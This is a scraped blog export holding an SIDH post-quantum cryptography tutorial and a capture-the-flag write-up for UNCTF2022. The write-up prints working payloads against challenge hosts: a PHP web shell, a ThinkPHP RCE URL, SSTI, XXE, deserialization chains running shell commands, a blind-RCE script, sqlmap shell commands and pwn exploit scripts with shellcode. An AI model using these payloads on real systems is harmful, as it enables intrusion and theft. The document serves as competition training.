r.recv(28).decode(&quot;utf8&quot;) r.recvuntil(&quot;= &quot;) cipher = r.recvline().strip().decode(&quot;utf8&quot;) proof = mbruteforce(lambda x: sha256((suffix+x).encode()).hexdigest() == cipher, table, length=4, method=&#x27;fixed&#x27;) r.sendlineafter(&#x27;xxxx = &#x27;, proof) pow()for i in range(51): print(i) r.recvuntil(&#x27;Press ENTER to continue... &#x27;) r.sendline() r.interactive() 按内容手动判断输入H（正常邮件）或S（垃圾邮件），得到结果： 12Good job! Just take it:flag&#123;da238e5ee5716136c6884c0b4a369093&#125; ​","categories":[{"name":"match","slug":"match","permalink":"https://lazzzaro.github.io/categories/match/"}],"tags":[{"name":"2022赛","slug":"2022赛","permalink":"https://lazzzaro.github.io/tags/2022%E8%B5%9B/"}],"author":"Lazzaro"},{"title":"后量子密码","slug":"crypto-后量子密码","date":"2022-12-16T14:04:27.000Z","updated":"2024-03-16T14:24:00.903Z","comments":true,"path":"2022/12/16/crypto-后量子密码/","permalink":"https://lazzzaro.github.io/2022/12/16/crypto-%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/","excerpt":"","text":"​ 后量子密码学（Post-Quantum Cryptography，PQC），又称抗量子计算密码学，是密码学的一个研究领域，专门研究能够抵抗量子计算机的加密算法，特别是公钥加密（非对称加密）算法。不同于量子密码学，后量子密码学使用现有的电子计算机，不依靠量子力学，它依靠的是密码学家认为无法被量子计算机有效解决的计算难题。 在公钥加密方面，后量子密码学的研究方向包括了格密码学（Lattice-based Cryptography）、容错学习问题（LWE）、多变量密码学（英语：Multivariate Cryptography）、散列密码学（英语：Hash-based Cryptography）、编码密码学（Code-based Cryptography）与超奇异椭圆曲线同源密码学（Supersingular Isogeny Key Exchange）。密码学家认为，基于这些计算难题有望构建出不受量子计算机的威胁的公钥加密系统，替代现有的方案。 ​ 基本概念超奇异椭圆曲线若曲线 $E$ 定义在有限域 $F_{p^r} (r \\in \\Z^*)$ 下，若 $E$ 的阶 $\\text{order}$ 满足 $\\text{order} = 1 \\pmod p$，则$E$ 是一条超奇异椭圆曲线 (Supersigular Elliptic Curve)。 123456p = 2^4*3^3-1F.&lt;i&gt; = GF(p^2, modulus = x^2 + 1)a = 208*i + 161Ea = EllipticCurve(F,[0,a,0,1,0])print(Ea.order() % p , Ea.is_supersingular()) j不变量（j-invariant）对于椭圆曲线来说，j不变量可以简单理解为一个判定两条椭圆曲线是否同构的值。也就是说，任何一个曲线都有自己独特的j不变量，而如果两条曲线的j不变量相等，则说明这两条曲线彼此同构。而由于同构的曲线本质上都可以看作同一条曲线，这也就说明，一个j不变量其实在同构意义上其实就唯一对应着一条曲线。 j不变量相同意味着，可以找到一个同构，将一条曲线映射到另一条曲线上。 二次扩域 $F_{p^2}$ 下共有 $p^2$ 个j不变量。 123456p = 2^4*3^3-1F.&lt;i&gt; = GF(p^2, modulus = x^2 + 1)a = 208*i + 161Ea = EllipticCurve(F,[0,a,0,1,0])j = Ea1.j_invariant() 同源（isogeny）一个可分的(separable)同源可以描述为：对于一条曲线 $E$ 以及 $E$ 上一个子群 $G$，都可以构造一个以 $G$ 为核的映射 $\\phi: E \\rightarrow E’$，这个映射就是同源，映射到的曲线 $E’$​ 就叫做这个同源的陪域(codomain)。 可以用这个子群 $G$ 和曲线 $E$ 生成一个同源，映射到的曲线 $E’$ 不再是原来的曲线E了，它的j不变量发生了变化。可以用如下方式求出曲线上所有阶为2的点： 12torsion_2_points = E(0).division_points(2)print(torsion_2_points) 同源图二次扩域 $F_{p^2}$ 下所有超奇异椭圆曲线的j不变量的图，对所有点的 $n$-torsion都画出这些边，就得到了完整的 $n$-isogeny 的同源图，能表示出这个二次扩域中所有度为 $n$​ 的 isogeny 的映射关系。 之所以边是无向的，就是因为有对偶映射，如果 $E$ 向 $E’$ 有个度为 $n$ 的同源，那么 $E’$ 向 $E$ 也一定有一个度为 $n$​ 的对偶同源。 模多项式（modular polynomial）用一个多项式关联了 $d$​​-isogeny 中互为邻居的两个j不变量。如果知道了一个j不变量，那么可以将其代入对应度的modular polynomial去求根，得到的所有根就是所有作为他的邻居的j不变量。 modular polynomial对应的度较低的多项式形式参考：Modular polynomials (mit.edu) 参考： Isogeny ​ 超奇异同源密钥交换（SIDH）超奇异椭圆曲线同源密码学（Supersingular Elliptic Curve Isogeny Cryptography）是利用超奇异椭圆曲线（Supersingular Elliptic Curves）与超奇异同源图（Supersingular Isogeny Graphs）的数学性质的密码学，可以实现超奇异同源密钥交换（Supersingular Isogeny Key Exchange，SIKE）（协议为超奇异同源Diffie-Hellman密钥交换协议，SIDH），具有前向安全性。其使用方法和现有的Diffie-Hellman密钥交换相似，有望直接替代当前的常规椭圆曲线密钥交换（ECDH）。 Diffie-Hellman基本协议： 抽象Diffie-Hellman： Alice的秘密是 $a$，她的计算先做→，得到 $g^a$，再做↓，得到 $g^{ab}$。而Bob的秘密是 $b$，他先做↓，再做→。殊途同归得到 $g^{ab}$。 SIDH构造的简化版本SIDH的基本代数结构是超奇异椭圆曲线群 $E$ 和超奇异同源（Isogeny）$\\phi$。基本思路如下图所示： 首先，超奇异椭圆曲线群 $E$ 理解为一个群。其次，构造用到的超奇异同源 $\\phi : E \\mapsto E’$ 是从群 $E$ 到群 $E’$ 的一种群同态。算法类似DH算法分为以下两个步骤： 首先，Alice选取一个点 $R_A \\in E$，$\\langle R_A \\rangle$ 确定了群 $E$ 的一个子群，然后可以计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\\phi_A: E \\mapsto E_A$，这是Alice的秘密信息。Alice发送公开信息 $E_A$ 给Bob。 同样，Bob选择点 $R_B\\in E$，然后计算得到 $\\phi_B: E \\mapsto E_B$，把公开信息 $E_B$ 发送给Alice。 最终Alice算出 $E/\\langle R_B, R_A \\rangle$，Bob算出 $E/\\langle R_A, R_B \\rangle$。上图中的 $E/\\langle R_A \\rangle$ 和 $E/\\langle R_B \\rangle$ 分别是 $E_A$ 和 $E_B$，这样表达是为了与之前的表达一致，其实这里并不是做商群，而是表达说 $\\phi_A$ 的Kernel是 $\\langle R_A \\rangle$。目前的科技文献大多使用这种表达。 上面说到，$E_A$ 是曲线群 $E$ 的子群，它由同源 $\\phi_A$ 决定，可理解为群同态 $\\phi_A$ 映射到 $E$ 上的像 (Image)形成的子群。同理，$E_{BA}$ 是同源 $\\phi_{BA}$ 映射到 $E$ 上的子群，而同源 $\\phi_{BA}$ 是由 $\\langle R_B, R_A \\rangle$ 决定的，即同源 $\\phi_{BA}$ 的Kernel是 $\\langle R_B, R_A \\rangle$。 SIDH构造的细化版本 为了满足Alice在没有Bob的秘密信息的情况下能计算出 $E_{BA}$ 的要求，SIDH需要使用更多的参数设计和相关计算。算法增加描述如下： SIDH参数设计首先，选择超奇异椭圆曲线 $E$ 作为公开参数。然后Alice随机选择两个元素 $P_A, Q_A \\in E$，并公开作为自己的公共参数。同样，Bob也随机选择两个元素 $P_B, Q_B \\in E$ 并公开。 Alice的操作 随机选择两个整数 $s_A$ 和 $t_A$ 作为秘密信息，计算 $R_A = s_A P_A + t_A Q_A\\in E$，并由 $R_A$ 计算得到一个从 $E$ 映射到其子群 $E_A$ 的同源 $\\phi_A: E \\mapsto E_A$，这也是Alice的秘密信息； 获取Bob的公开信息，并计算 $\\phi_A(P_B)$ 和 $\\phi_A(Q_B)$，这些是公开信息； Alice发送公开信息 $E_A$、$\\phi_A(P_B)$ 和 $\\phi_A(Q_B)$ 给Bob。 Bob的操作 随机选择两个整数 $s_B$ 和 $t_B$ 作为秘密信息，计算 $R_B = s_B P_B + t_B Q_B\\in E$，并由 $R_B$ 计算得到一个从 $E$ 映射到其子群 $E_B$ 的同源 $\\phi_B: E \\mapsto E_B$，这也是Bob的秘密信息； 获取Alice的公开信息，并计算 $\\phi_B(P_A)$ 和 $\\phi_B(Q_A)$，这些是公开信息； Bob发送公开信息 $E_B$、$\\phi_B(P_A)$ 和 $\\phi_B(Q_A)$ 给Alice。 秘密值的计算Alice计算子群 $E_{BA}$ ，方法如下： 注意，此时Alice掌握的信息是 $s_A$、$t_A$、$R_A$、$\\phi_B(P_A)$ 和 $\\phi_B(Q_A)$，她想计算得到 $\\phi_B(R_A)$。并且要强调，$\\phi_B$ 是一种群同态。 利用群同态的属性可计算得到：$\\phi_B(R_A) = \\phi_B(s_A P_A + t_A Q_A) = s_A \\phi_B(P_A) + t_A \\phi_B(Q_A)$ 。 根据 $\\phi_B(R_A)$ 计算 $E_{BA}$。$E_{BA}$是曲线群 $E$ 的子群，是以 $\\phi_B (R_A)$ 为Kernel的群同态映射到 $E$ 上的子群。这个群同态也就是Isogeny，这个Isogeny记为 $\\phi_{BA}$ 。 类似的，Bob可以计算子群 $E_{AB}$： $\\phi_A(R_B) = s_B \\phi_A(P_B) + t_B \\phi_A(Q_B)$； 由此可计算得 $E_{AB}$ ； 最后冲顶的一步，计算秘密值。首先要明确，很可能 $E_{BA} \\ne E_{AB}$，但是，$E_{BA}$ 同构于 $E_{AB}$。利用同构曲线的一个属性：所有同构曲线的J-Invariant值相同。于是Alice和Bob分别计算这两条曲线的J-Invariant值 $J(E_{BA})$ 和 $J(E_{AB})$，这就是他们共同拥有的秘密。J-Invariant的计算定义可在标准教科书中找到，本文把它视为黑盒子使用。 Sage代码参数设置 1234567891011121314151617181920#选取一条在素域k上的超奇异椭圆曲线lA, lB = 2, 3eA, eB = 6, 7p = lA ^ eA * lB ^ eB - 1assert p.is_prime()assert p % 4 == 3k = GF(p) # 注意，这里并不是标准做法，只是因为Sage的局限不得已E = EllipticCurve(k, [1, 0]) #选取曲线EE.is_supersingular() # 看看所生成的曲线是否超奇异.print(E.j_invariant())#选取四个随机点作为公共参数points = []while len(points) != 4: p = E.random_point() if p not in points: points.append(p)PA, PB, QA, QB = pointsPA, PB, QA, QB Alice 的操作 12345678910111213141516#Alice选择两个随机数并计算自己的秘密值RA#RA定义了phi_A的kernelsA, tA = 123, 525RA = sA * PA + tA * QAprint(RA)#phiA就是同源也是群同态phiA = E.isogeny(RA)#Alice的公共信息EAEA = phiA.codomain()print(E.is_isogenous(EA)) # 确认EA与E同源#Alice发送以下信息给BobEA, phiA_PB, phiA_QB = EA, phiA(PB), phiA(QB)EA, phiA_PB, phiA_QB Bob 的操作 123456789101112131415#Bob的工作类似sB, tB = 812, 580RB = sB * PB + tB * QBprint(RB)#phiB就是从E到EB同态映射,Kernel是RBphiB = E.isogeny(RB)#Bob的公共信息EBEB = phiB.codomain()print(E.is_isogenous(EB)) # 确认EB与E同源# Bob发送以下信息给AliceEB, phiB_PA, phiB_QA = EB, phiB(PA), phiB(QA)EB, phiB_PA, phiB_QA 秘密值计算 1234567891011121314151617# Alice计算秘密值R_BA = sA * phiB_PA + tA * phiB_QAprint(R_BA)phiBA = EB.isogeny(R_BA)print(phiBA)KA = phiBA.codomain().j_invariant()# Bob计算秘密值R_AB = sB * phiA_PB + tB * phiA_QBprint(R_AB)phiAB = EA.isogeny(R_AB)print(phiAB)KB = phiAB.codomain().j_invariant()#测试秘密值是否相等if KA == KB: print(&quot;Success!&quot;) Castryck-Decru攻击（待补充） 参考： Castryck-Decru-SageMath An efficient key recovery attack on SIDH Castryck-Decru Key Recovery Attack on SIDH","categories":[{"name":"crypto","slug":"crypto","permalink":"https://lazzzaro.github.io/categories/crypto/"}],"tags":[{"name":"后量子密码","slug":"后量子密码","permalink":"https://lazzzaro.github.io/tags/%E5%90%8E%E9%87%8F%E5%AD%90%E5%AF%86%E7%A0%81/"}],"author":"Lazzaro"},{"title":"UNCTF2022-公开赛","slug":"match-UNCTF2022-公开赛","date":"2022-11-18T11:43:08.000Z","updated":"2022-11-20T17:32:45.560Z","comments":true,"path":"2022/11/18/match-UNCTF2022-公开赛/","permalink":"https://lazzzaro.github.io/2022/11/18/match-UNCTF2022-%E5%85%AC%E5%BC%80%E8%B5%9B/","excerpt":"","text":"​ 为深入贯彻习近平总书记关于二十大提出的网络强国的重要思想，围绕建设网络强国的战略部署，建设网络强国的战略部署要与“两个一百年”奋斗目标同步推进，由御之安承办UNCTF2022网络安全大赛（以下简称“大赛”）将于今年11月份召开，以赛事为契机，提升网络安全保障能力，汇聚高端网络安全人才，共筑网络安全防线，为中国网络安全事业发展提供智力支撑和保障。 线上报名：2022年10月24日10:00-11月11日10:00，比赛时间：2022年11月12日12:00-11月18日12:00 Rank: 1 # Web我太喜欢bilibili大学啦phpinfo页面环境变量中直接泄露flag。 ​ ezgame 简单的游戏~ 打过boss就能获得flag F12查看js，在main.js里搜索 unctf，在混淆js代码中找到flag片段，连接起来得：unctf&#123;c5f9a27d-6f88-49fb-a510-fe7b163f8dd3&#125;。 ​ 签到 又是一道简单的签到 F12发现注释有学号 20200101 为账号密码，尝试 20200102/20200103/20200104/20200105 分别回显 f/l/a/g，脚本遍历提取： 123456789import requestsurl = &#x27;http://365172a3-2701-4e1a-8f59-a548f14e7027.node.yuzhian.com.cn/index.php&#x27;flag = &#x27;&#x27;for i in range(20200102,20200102+40): data = &#123;&#x27;username&#x27;:f&#x27;&#123;i&#125;&#x27;,&#x27;password&#x27;:&#x27;&#x27;&#125; r = requests.post(url,data=data) flag += r.text[-5][0] print(flag) ​ babyphp弱类型比较。第一层，16进制0x绕过；第二层，数组绕过；第三层，用其他命令和通配符绕过RCE。 Payload： /index.php?code=print_r(exec(&quot;uniq%09/fl*&quot;));，POST：a=0x&amp;key1[]=a&amp;key2[]=b ​ easy_upload 简简单单的文件上传 无过滤的文件上传。上传一个 1.php，内含 &lt;?php system($_GET[x]);，再访问传入命令RCE。 Payload：/uplO4d/1.php?x=cat%20/home/ctf/flag ​ 给你一刀ThinkPHP 5.0.x未开启强制路由RCE漏洞。 Payload: ?s=index/\\think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=env flag: UNCTF&#123;Y0u_A3r_so_G9eaD_hacker&#125; ​ 302与深大 thai想让你知道szu的战队……吗，醒醒，这个页面不是主页！ Request头的考察。 123/?miku=puppyPOST: micgo=ikunCookie: admin=true flag: UNCTF&#123;thai_miku_micgo_qka_WEB_GOD&#125; ​ easy ssti php看腻了，来点python吧 基本无过滤的SSTI。 Payload： /register，POST：user=&#123;&#123;cycler.__init__.__globals__.os.popen('env').read()&#125;&#125;&amp;pwd= ​ 听说php有一个xxeXXE。先访问 /hint，再访问 /dom.php，根据 DOMDocument::loadXML()信息，POST一个XML数据读flag： 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; &lt;!DOCTYPE creds [ &lt;!ENTITY goodies SYSTEM &quot;file:///flag&quot;&gt; ]&gt; &lt;creds&gt;&amp;goodies;&lt;/creds&gt; ​ ezunseri 好像还没有反序列化的题目？ 反序列化链：Login:__destruct() =&gt; Exec:__get() =&gt; Test:__toString() =&gt; Exec:__invoke() =&gt; Exec:execute() 构造： 1234567891011121314151617181920212223from phpserialize import serializefrom urllib.parse import quoteclass Exec: public_content=&#x27;system(&quot;cat /flag&quot;);&#x27; class Test: public_test=Exec() public_key=&#x27;?&#x27; class Exec: public_content=Test() class Login: private_name=&#x27;&#x27; public_code=&#x27;3.1415926&#x27; public_key=Exec()print(quote(serialize(Login())))# O%3A5%3A%22Login%22%3A3%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D# 绕__wakeup():# O%3A5%3A%22Login%22%3A4%3A%7Bs%3A11%3A%22%00Login%00name%22%3Bs%3A0%3A%22%22%3Bs%3A4%3A%22code%22%3Bs%3A9%3A%223.1415926%22%3Bs%3A3%3A%22key%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3BO%3A4%3A%22Test%22%3A2%3A%7Bs%3A3%3A%22key%22%3Bs%3A1%3A%22%3F%22%3Bs%3A4%3A%22test%22%3BO%3A4%3A%22Exec%22%3A1%3A%7Bs%3A7%3A%22content%22%3Bs%3A20%3A%22system%28%22cat%20/flag%22%29%3B%22%3B%7D%7D%7D%7D ​ poppop反序列化链：B:__destruct() =&gt; C:__toString() =&gt; A:__call() 构造： 1234567891011121314151617from phpserialize import serializefrom urllib.parse import quoteclass A: public_code=&#x27;system(&quot;env&quot;);&#x27;; class C: private_key2=A() class B: public_key=C() print(quote(serialize(B()))) # O%3A1%3A%22B%22%3A1%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D# 绕__wakeup():# O%3A1%3A%22B%22%3A2%3A%7Bs%3A3%3A%22key%22%3BO%3A1%3A%22C%22%3A1%3A%7Bs%3A7%3A%22%00C%00key2%22%3BO%3A1%3A%22A%22%3A1%3A%7Bs%3A4%3A%22code%22%3Bs%3A14%3A%22system%28%22env%22%29%3B%22%3B%7D%7D%7D ​ babynode 你能污染对象吗 原型链污染。 Payload： POST： &#123;&quot;__proto__&quot;:&#123;&quot;id&quot;:&quot;unctf&quot;&#125;&#125; ​ easy_rce rce布尔盲注 无回显RCE，可以采用 if+head+cut+sleep 方式逐位猜解flag各个字符。 123456789101112131415161718192021222324import requestsimport stringimport timeurl = &#x27;http://c88b47e2-7088-4011-8d20-f4e5677e765e.node.yuzhian.com.cn/?code=&#x27;dic = string.ascii_letters+string.digits+&#x27;&#123;-&#125;&#x27;flag = &#x27;&#x27;for i in range(1,50): judge = 0 for j in dic: now = f&#x27;&#123;url&#125;a=$(tac /f?ag | head -1 | cut -b &#123;i&#125;)%0aif [ $a = &#123;j&#125; ]%0athen sleep 2%0afi&#x27; start = time.time() r = requests.get(now) end = time.time() if int(end)-int(start) &gt; 1: judge = 1 flag += j print(flag) break if judge == 0: break print(flag) ​ 随便注 好像见过，又好像不是 sqlmap能跑出： 12345sqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; --dbssqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; -D ctftraining --tablessqlmap -u &quot;http://86c207df-b12e-47cb-b6a5-bb33e69a5381.node.yuzhian.com.cn/?id=1&quot; -D ctftraining -T FLAG_TABLE --sql-shellsql-shell&gt; select load_file(&quot;/flag&quot;); ​ ez2048F12在game.js内查看关键代码，为首页invite_code验证逻辑： 1234567891011121314151617181920212223242526272829303132333435363738checkInvited() &#123; let args = [...arguments]; let buf = new ArrayBuffer(24); const view = new DataView(buf); view.setUint8(0, 68); view.setUint8(1, 51); view.setUint8(2, 15); view.setUint8(3, 80); view.setUint16(4, 0x0e5d, true); view.setUint16(6, 0x323a, true); view.setUint16(8, 0x3058, true); view.setUint16(10, 0x1a2a, true); view.setUint32(12, 0x0512160d, true); view.setUint32(16, 0x02560002); view.setUint32(20, 0x130000); function check(code) &#123; if (code.length !== 24) return false; let encode = []; for (let i = 0; i &lt; code.length; i++) &#123; if (~i % 2 === 0) &#123; encode.push(code.charCodeAt(i) ^ code.charCodeAt(i - 2)); &#125; else &#123; encode.push(code.charCodeAt(i) ^ code.charCodeAt(i + 1)); &#125; &#125; for (let i = 0; i &lt; code.length; i++) &#123; if (view.getInt8(i) !== encode[i]) return false; &#125; return true; &#125; return function () &#123; if (!!arguments.length) &#123; [].push.apply(args, arguments); return arguments.callee; &#125; return check(args.join(&quot;&quot;)); &#125;; &#125; 写简单脚本还原输入： 1234567891011121314c = [68,51,15,80,93,14,58,50,88,48,42,26,13,22,18,5,2,86,0,2,0,19,0,0]print(len(c))t = [-1]*24t[1] = c[1]t[0] = t[1]^c[0]for i in range(3,24,2): t[i] = t[i-2]^c[i] t[i-1] = t[i]^c[i-1]print(bytes(t))# b&#x27;w3lc0me_7o_unctf2022!!!!&#x27; 再观察发现存在game.wasm，使用wabt工具逆wasm得到密文 \\x22&#125;/7v\\x16\\x0d&gt;GV&amp;*\\x5cS@^mWS_D~V\\x10\\x03[3\\x16^\\x0eR9\\x05_mG\\x10\\x1efalse\\x00，尝试与前面得到的invite_code异或，得到 UNCTF&#123;hap9y_2048_game_w1th_unc7f2022~&#125;..^CW2。 ​ 世界和平 提示1：堆叠注入 根据提示进行堆叠注入： 123450;show databases;#数据库名 score_mbamission/score_minnesotaunited/snert0;show tables;# 表名 Flag/users 使用 0;select * from Flag 查找Flag表中内容，发现无回显，猜测对 select 或 from 或 Flag 有过滤。 尝试 0;seLseLectect version();#，只用 select 大写+双写可以绕过得到内容，则 再用 0;seLseLectect * fRfRomom FlFlagag;# 即可拿到flag。 ​ 快乐三消 打CTF累了来玩三消放松一下叭 查看源码，除了进入 /h5/index.php 和 /h4/king.php，没有其他有用信息。 扫目录发现 /.git/ 和 /admin/，用GitHack还原出 index.php 和 phpinfo.php，无有用信息。 用 admin/unctf 进入后台页面， 在网页预览功能发现url为 /admin/fi.php?filename=index.php，尝试发现存在文件包含漏洞，访问 /admin/fi.php?filename=/flag 得到flag。 ​ # PwnwelcomeUNCTF2022 easy easy easy Pwn 签到pwn。 12345from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,37591)r.sendline(&#x27;UNCTF&amp;2022\\x00&#x27;)r.sendline(&#x27;cat /flag&#x27;)print(r.recvall()) ​ 石头剪刀布伪随机数组，给了srand种子值，依照代码逻辑求出固定种子值下的100个rand值： [1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2] 再根据石头剪刀布规则完成后半部分交互： 123456789101112131415161718192021from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,30253)rand = [1,1,2,2,0,2,2,1,2,2,2,2,0,0,2,1,0,1,2,0,0,1,1,1,1,2,1,1,1,0,0,2,0,1,2,0,0,1,0,2,1,2,1,2,0,1,1,1,0,0,2,0,2,1,2,1,0,0,2,2,1,1,2,1,2,2,2,2,1,0,2,0,2,0,0,1,2,2,2,0,0,1,0,1,0,0,2,0,1,0,0,2,1,1,1,1,0,1,1,2]need = []for i in range(100): if rand[i] == 0: need.append(2) elif rand[i] == 1: need.append(0) elif rand[i] == 2: need.append(1)r.recvuntil(&#x27;pwn later?(y/n)\\n&#x27;)r.sendline(&#x27;y&#x27;)for i in range(100): print(r.recvuntil(&#x27;]\\x1B[0m\\n&#x27;)) r.sendline(str(need[i])) print(i,r.recvline())r.interactive() ​ checkin测试符合条件的数： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;typedef unsigned int uint32;#define _DWORD uint32#define LODWORD(x) (*((_DWORD*)&amp;(x)))int main()&#123; size_t nbytes; char nptr[32]=&quot; -33&quot;; LODWORD(nbytes) = atoi(nptr); printf(&quot;%d\\n&quot;,atoi(nptr)); printf(&quot;%x\\n&quot;,nptr[0]); if ( atoi(nptr) &gt; 32 || nptr[0] == 0x2D ) &#123; puts(&quot;No!!Hacker&quot;); &#125; printf(&quot;%u&quot;,(unsigned int)nbytes); return 0;&#125; 交互： 123456789101112from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,39482)r.recvuntil(&#x27;name: \\n&#x27;)r.send(&#x27;xx&#x27;)r.recvuntil(&#x27;size: \\n&#x27;)r.send(&#x27; -33&#x27;)pl = &#x27;a&#x27;*(0x50+8)+p64(0x4008c3)r.send(pl)r.interactive() ​ int 0x80 easy easy easy Pwn ret2shellcode，其中的 __ctype_b_loc 函数的作用可参考 ctype/ctype.h 源码，将输入的字符根据 ((bit) &lt; 8 ? ((1 &lt;&lt; (bit)) &lt;&lt; 8) : ((1 &lt;&lt; (bit)) &gt;&gt; 8)) 进行处理，然后根据下面表对应的内容返回。参考 2021 天翼杯 pwn ezshell。 s[i] &amp; 0x4000 != 0 意思即要求的输入字符是可见字符。 参考 mrctf2020_shellcode_revenge，使用全可见字符shellcode输入即可： 12345678910from pwn import *r = remote(&#x27;node.yuzhian.com.cn&#x27;,32261)r.recvline()r.send(&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;)r.interactive()# UNCTF&#123;h3ll0_w_0_r_1_d&#125; ​ # Reversewhereisyourkey 你能找到属于你的key吗？ 简单替换加密。 1234567891011s = [121, 101, 115, 105, 97, 107, 102, 108, 97, 103]for i in range(len(s)): if s[i] == 109: pass elif s[i] &lt;= 110: s[i] -= 2 elif s[i] &gt; 111: s[i] += 3print(bytes(s))# b&#x27;yesiamflag&#x27; ​ ezzzzre re签到题 exeinfo发现UPX壳，脱壳后，IDA中分析逻辑，顺着实现得flag： 12345s = list(b&#x27;HELLOCTF&#x27;)out = [2*k-69 for k in s]print(bytes(out))# b&#x27;KESSYAcG&#x27; ​ Sudoku数独判定逻辑。直接运行显示的数独是错的，动调获取正确的数独初始数组，找个在线网站解了后填入为： [8, 5, 2, 4, 9, 1, 6, 7, 3, 1, 9, 6, 7, 3, 8, 2, 5, 4, 4, 3, 7, 5, 6, 2, 9, 1, 8, 5, 2, 8, 1, 4, 6, 3, 9, 7, 3, 7, 4, 9, 2, 5, 8, 6, 1, 9, 6, 1, 3, 8, 7, 4, 2, 5, 2, 1, 9, 8, 5, 4, 7, 3, 6, 7, 4, 3, 6, 1, 9, 5, 8, 2, 6, 8, 5, 2, 7, 3, 1, 4, 9] 依次输入后得到 Y0u_Ar3_R1ght!Th1s_1s_your_f1aaag! UNCTF&#123;chr(29+vme)chr(15+vme)chr(29+vme)chr(24+vme)chr(39+vme)chr(25+vme)chr(29+vme)chr(20+vme)chr(32+vme)&#125; 其中 vme=50，即flag：UNCTF&#123;OAOJYKOFR&#125;。 ​ haloexeinfo发现UPX壳，脱壳后，IDA中分析逻辑，为两轮异或，还原： 12345678910111213141516s = [85, 11, 104, 12, 115, 62, 12, 58, 93, 27, 33, 117, 79, 32, 76, 113, 88, 123, 89, 44, 0, 119, 88, 119, 14, 114, 91, 38, 11, 112, 10, 119, 102, 119, 54, 118, 55, 118, 98, 114, 109, 39, 63, 119, 38, 38]s = [s[i]^0x33 for i in range(len(s))]print(s)for i in range(len(s)-1,0,-1): s[i] ^= s[i-1]^iprint(bytes(s))# b&#x27;f_ag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125;-&#x27;# 修正：flag&#123;H41oO0_6bb2920f8b98ae3f1fdb10cced277c2c&#125; ​ HelloRust 快来逆逆这一坨答辩罢 IDA打开，分析代码逻辑，识别为RC4算法，找到密文hex值 876927216FC731261B6C3A749A626EA002811D85E0E2D071F4A3090E，以及key值 UnCtF2022， 使用Cyberchef得到flag明文：unctf&#123;Ru5t_Rc4_1s_2_e@zy!!!&#125;。 ​ ezast 你会ast吗 JavaScript抽象语法树（AST），定位密文 OTYN\\\\\\\\a[inE+iEl.hcEo)ivo+g，且中间运算包含异或操作，尝试使用Cyberchef异或爆破，发现在key=0x1a时，得到flag：UNCTF&#123;Ast_1s_v4ry_u3slu1&#125;。 ​ HUAQIANG深育杯原题 生瓜蛋子，参考官方wp，代码逻辑为一个VM，逐位爆破flag每位的可行值，得到满足条件的输入：998bc64bbd919f27f44e5e2750644c。 ​ # Cryptomd5-1爆破可见字符得到md5表，再依次遍历密文取出相应字符。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455from hashlib import md5c = &#x27;&#x27;&#x27;4c614360da93c0a041b22e537de151eb8d9c307cb7f3c4a32822a51922d1ceaa0d61f8370cad1d412f80b84d143e1257b9ece18c950afbfa6b0fdbfa4ff731d3800618943025315f869e4e1f09471012f95b70fdc3088560732a5ac135644506e1671797c52e15f763380b45e841ec32c9f0f895fb98ab9159f51fd0297e236da87ff679a2f3e71d9181a67b7542122c8fa14cdd754f91cc6554c9e71929cce7e1671797c52e15f763380b45e841ec328277e0910d750195b448797616e091adcfcd208495d565ef66e7dff9f98764dac81e728d9d4c2f636f067f89cc14862cc9f0f895fb98ab9159f51fd0297e236d92eb5ffee6ae2fec3ad71c777531578f45c48cce2e2d7fbdea1afc51c7c6ad26cfcd208495d565ef66e7dff9f98764daa87ff679a2f3e71d9181a67b7542122c1679091c5a880faf6fb5e6087eb1b2dc8fa14cdd754f91cc6554c9e71929cce74a8a08f09d37b73795649038408b5f33cfcd208495d565ef66e7dff9f98764dae1671797c52e15f763380b45e841ec32c9f0f895fb98ab9159f51fd0297e236d8fa14cdd754f91cc6554c9e71929cce7cfcd208495d565ef66e7dff9f98764dac9f0f895fb98ab9159f51fd0297e236dcfcd208495d565ef66e7dff9f98764dae1671797c52e15f763380b45e841ec3245c48cce2e2d7fbdea1afc51c7c6ad261679091c5a880faf6fb5e6087eb1b2dce1671797c52e15f763380b45e841ec328f14e45fceea167a5a36dedd4bea2543c81e728d9d4c2f636f067f89cc14862cc4c